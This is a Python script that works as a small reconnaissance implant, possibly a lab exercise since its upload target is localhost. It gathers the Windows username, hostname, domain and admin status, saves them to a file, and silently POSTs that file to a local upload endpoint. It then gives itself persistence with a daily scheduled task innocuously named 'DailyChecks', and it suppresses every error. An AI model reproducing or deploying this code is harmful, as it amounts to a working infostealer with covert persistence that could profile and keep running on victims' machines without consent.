
import os
import requests
import getpass
import socket
import subprocess
import ctypes


def gather_info():
    username = getpass.getuser()
    hostname = socket.gethostname()
    domain = os.environ.get('USERDOMAIN', 'Unknown')

    # Check if user has admin privileges
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() !=0
    except:
        is_admin = False

    privilege= "Administrator" if is_admin else "Standard User"


    return f"Username: {username}\nHostname: {hostname}\nDomain: {domain}\nPrivileges: {privilege}\n"

def save_to_file(data, filename="ready2send.txt"): 
    with open(filename, "w") as file:
        file.write(data)

def send_to_localhost(filename="ready2send.txt"):
    try:
        with open(filename, "rb") as f:
            requests.post("http://127.0.0.1:5000/upload", files={"file": f})
    except:
        pass # Fail silently

def create_scheduled_task(exe_path) :
    try:
        #Create a scheduled task named DailyChecks to run at 4 PM daily
        cmd = [
            "schtasks",
            "/create",
            "/tn", "DailyChecks",
            "/tr", exe_path,
            "/sc", "daily",
            "/st", "16:00",
            "/f"
        ]
        subprocess.run(cmd, shell=True)
    except Exception as e:
        pass # Fail silently

if __name__ == "__main__":
    info = gather_info()
    save_to_file(info)
    send_to_localhost()

    # Add scheduled task for future runs
    exe_path= os.path.abspath(__file__)  # If running as .exe, this will be the exe path
    create_scheduled_task(exe_path)